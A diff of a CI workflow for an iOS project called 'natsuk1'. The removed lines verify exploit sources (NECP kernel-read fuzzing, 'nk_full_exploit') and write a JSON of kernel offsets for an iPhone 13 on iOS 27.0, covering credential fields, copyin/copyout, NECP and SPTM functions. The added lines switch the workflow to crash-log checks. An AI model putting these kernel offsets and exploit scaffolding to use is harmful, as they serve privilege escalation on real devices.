-          test "$(grep -c 'natsuk1-kread-v8-fuzz' "$F")" = "1"
-          test "$(grep -c 'nk_full_exploit' "$F")" = "0"
-          test "$(grep -c 'nk_full_exploit' natsuk1/Exploit/nk_api.c)" = "1"
-          test "$(grep -c 'natsuk1-v8-api' natsuk1/Exploit/nk_api.c)" = "1"
-          grep -n 'memcpy(&val, buf + i, 8)' "$F"
-          grep -n 'val >= KPTR_MIN && val <= KPTR_MAX' "$F"
-          SDK=$(xcrun --sdk iphoneos --show-sdk-path)
-          clang -fsyntax-only -isysroot "$SDK" -arch arm64 -x c \
-            -I"$(pwd)/natsuk1/Exploit" -Wall -Wno-everything "$F"
-          echo "syntax OK"
-
-      - name: Write Offsets JSON
-        run: |
-          mkdir -p natsuk1/Offsets
-          cat > natsuk1/Offsets/iPhone14,5_iOS27.0_24A437.json <<'JSON'
-          {
-            "groups": [
-              { "title": "Kernel",  "items": ["off_kernel_base","off_sysent_base","off_sysent_count","off_sysent_stride","off_mach_trap_table"] },
-              { "title": "Globals", "items": ["off_g_kernproc","off_g_task_list","off_g_allproc","off_g_kernel_task","off_g_zone_map","off_g_kernel_map"] },
-              { "title": "Primitives", "items": ["off_fn_copyin","off_fn_copyout","off_fn_kalloc_ext","off_fn_kfree_ext"] },
-              { "title": "proc", "items": ["off_proc_p_list_next","off_proc_p_pid","off_proc_p_task","off_proc_ro_p_ucred","off_proc_p_csflags"] },
-              { "title": "task / thread", "items": ["off_task_map","off_task_bsd_info","off_task_itk_space","off_task_cr_label","off_thread_task_threads_next"] },
-              { "title": "ucred", "items": ["off_ucred_cr_uid","off_ucred_cr_svuid","off_ucred_cr_gid","off_ucred_cr_svgid"] },
-              { "title": "NECP", "items": ["off_necp_open","off_necp_client_add_flow","off_necp_client_remove_flow","off_ncf_assigned","off_ncf_assigned_len","off_ncf_parent","off_ncf_refcnt","off_ncf_struct_sz"] },
-              { "title": "Zones", "items": ["off_zone_data_kalloc","off_zone_early_kalloc","off_zone_kalloc_type_var","off_zone_site_struct_task","off_zone_site_struct_proc","off_zone_site_struct_thread","off_zone_site_struct_ucred","off_zone_site_struct_ipc_port","off_zone_site_struct_ipc_entry","off_zone_site_struct_fileproc","off_zone_site_struct_fileglob","off_zone_site_struct_vnode","off_zone_site_struct_mount","off_zone_site_struct_socket","off_zone_site_struct_inpcb","off_zone_site_struct_pipe","off_zone_site_struct_vm_page"] },
-              { "title": "SPTM", "items": ["off_sptm_base","off_sptm_ctrr_lock_boot","off_sptm_cpu_lock_system_registers","off_sptm_determine_kernel_ctrr","off_sptm_bootstrap","off_sptm_map","off_sptm_region","off_sptm_panic","off_sptm_page_table"] }
-            ],
-            "defaults": {
-              "off_kernel_base": "0xFFFFFFF007004000",
-              "off_sysent_base": "0x0",
-              "off_sysent_count": "558",
-              "off_sysent_stride": "24",
-              "off_mach_trap_table": "0xFFFFFFF007BE8018",
-              "off_g_kernproc": "0xFFFFFFF007BBF040",
-              "off_g_task_list": "0xFFFFFFF0080D93F0",
-              "off_g_allproc": "0x0",
-              "off_g_kernel_task": "0x0",
-              "off_g_zone_map": "0x0",
-              "off_g_kernel_map": "0x0",
-              "off_fn_copyin": "0xFFFFFFF00A7B9570",
-              "off_fn_copyout": "0xFFFFFFF00A2C6C28",
-              "off_fn_kalloc_ext": "0xFFFFFFF00A200DCC",
-              "off_fn_kfree_ext": "0xFFFFFFF00A201000",
-              "off_proc_p_list_next": "0x0",
-              "off_proc_p_pid": "0x74",
-              "off_proc_p_task": "0x78",
-              "off_proc_ro_p_ucred": "0x98",
-              "off_proc_p_csflags": "0xA8",
-              "off_task_map": "0x28",
-              "off_task_bsd_info": "0x4E0",
-              "off_task_itk_space": "0x320",
-              "off_task_cr_label": "0xE8",
-              "off_thread_task_threads_next": "0x50",
-              "off_ucred_cr_uid": "0x18",
-              "off_ucred_cr_svuid": "0x1C",
-              "off_ucred_cr_gid": "0x20",
-              "off_ucred_cr_svgid": "0x24",
-              "off_necp_open": "0xFFFFFFF00A4E411C",
-              "off_necp_client_add_flow": "0xFFFFFFF00A4E843C",
-              "off_necp_client_remove_flow": "0xFFFFFFF00A4E93C4",
-              "off_ncf_assigned": "0x68",
-              "off_ncf_assigned_len": "0x70",
-              "off_ncf_parent": "0x88",
-              "off_ncf_refcnt": "0x58",
-              "off_ncf_struct_sz": "0x400",
-              "off_zone_data_kalloc": "0xFFFFFFF007C62E70",
-              "off_zone_early_kalloc": "0xFFFFFFF007BBB170",
-              "off_zone_kalloc_type_var": "0xFFFFFFF007BC2800",
-              "off_zone_site_struct_task": "0xFFFFFFF007C64080",
-              "off_zone_site_struct_proc": "0xFFFFFFF007C71240",
-              "off_zone_site_struct_thread": "0xFFFFFFF007C63D00",
-              "off_zone_site_struct_ucred": "0xFFFFFFF007C6F140",
-              "off_zone_site_struct_ipc_port": "0xFFFFFFF007C79248",
-              "off_zone_site_struct_ipc_entry": "0xFFFFFFF007C79298",
-              "off_zone_site_struct_fileproc": "0xFFFFFFF007C7CD08",
-              "off_zone_site_struct_fileglob": "0xFFFFFFF007C7D708",
-              "off_zone_site_struct_vnode": "0xFFFFFFF007C660C0",
-              "off_zone_site_struct_mount": "0xFFFFFFF007C662C0",
-              "off_zone_site_struct_socket": "0xFFFFFFF007C70C40",
-              "off_zone_site_struct_inpcb": "0xFFFFFFF007C6D180",
-              "off_zone_site_struct_pipe": "0xFFFFFFF007C6FE80",
-              "off_zone_site_struct_vm_page": "0xFFFFFFF007C64C80",
-              "off_sptm_base": "0xFFFFFFF027004000",
-              "off_sptm_ctrr_lock_boot": "0xFFFFFFF027006E62",
-              "off_sptm_cpu_lock_system_registers": "0xFFFFFFF0270B39B4",
-              "off_sptm_determine_kernel_ctrr": "0xFFFFFFF0270B2224",
-              "off_sptm_bootstrap": "0xFFFFFFF0270D21CC",
-              "off_sptm_map": "0xFFFFFFF0270E97BC",
-              "off_sptm_region": "0xFFFFFFF0270ECFF0",
-              "off_sptm_panic": "0xFFFFFFF0270BEE18",
-              "off_sptm_page_table": "0xFFFFFFF0270D13D4"
-            }
-          }
-          JSON
-
-      - name: Write offsets index
-        run: |
-          cat > natsuk1/Offsets/index.json <<'JSON'
-          {
-            "versions": [
-              {
-                "file": "iPhone14,5_iOS27.0_24A437.json",
-                "device": "iPhone14,5",
-                "deviceName": "iPhone 13",
-                "chip": "A15 Bionic",
-                "ios": "27.0",
-                "build": "24A437",
-                "verified": false
-              }
-            ]
-          }
-          JSON
+          test -f natsuk1/Helpers/CrashLog.swift
+          test -f natsuk1/Views/RuntimeView.swift
+          test -f natsuk1/Views/CrashLogView.swift
+          test "$(grep -c 'natsuk1-crashlog-v1' natsuk1/natsuk1.swift)" = "1"
+          test "$(grep -c 'natsuk1-crashlog-v1' natsuk1/Views/OverviewView.swift)" = "1"
+          grep -q 'CrashLog.shared.install()' natsuk1/natsuk1.swift
+          grep -q 'recoverPreviousSession' natsuk1/natsuk1.swift
+          grep -q 'markCleanShutdown' natsuk1/natsuk1.swift
+          grep -q 'parseLogLine' natsuk1/natsuk1.swift
+          grep -q 'RuntimeView()' natsuk1/Views/OverviewView.swift
+          grep -q 'CrashLogView' natsuk1/Views/CrashLogView.swift
+          grep -q 'NSSetUncaughtExceptionHandler' natsuk1/Helpers/CrashLog.swift
+          grep -q 'signal(SIGSEGV' natsuk1/Helpers/CrashLog.swift
+          echo "verify OK"
 
       - name: Install tools
         run: brew install xcodegen ldid || true
@@ -633,14 +523,19 @@ jobs:
           gh release create development natsuk1.ipa \
             --target "${GITHUB_SHA}" --title "Development" \
             --prerelease --latest=false \
-            --notes "kread v8-fuzz: NCF_ASSIGNED_OFF sweep, nk_full_exploit routed to fuzz"
+            --notes "crash-log + runtime view"
 
       - name: Commit
         run: |
           set -euo pipefail
           git config user.name "github-actions[bot]"
           git config user.email "github-actions[bot]@users.noreply.github.com"
-          git add natsuk1/Exploit/necp.c natsuk1/Exploit/nk_api.c natsuk1/Offsets/
+          git add \
+            natsuk1/Helpers/CrashLog.swift \
+            natsuk1/Views/RuntimeView.swift \
+            natsuk1/Views/CrashLogView.swift \
+            natsuk1/natsuk1.swift \
+            natsuk1/Views/OverviewView.swift
           if git diff --cached --quiet; then echo "no changes"; exit 0; fi
-          git commit -m "kread v8: fuzz + route nk_full_exploit [skip ci]"
+          git commit -m "crash-log + runtime view [skip ci]"
           git push
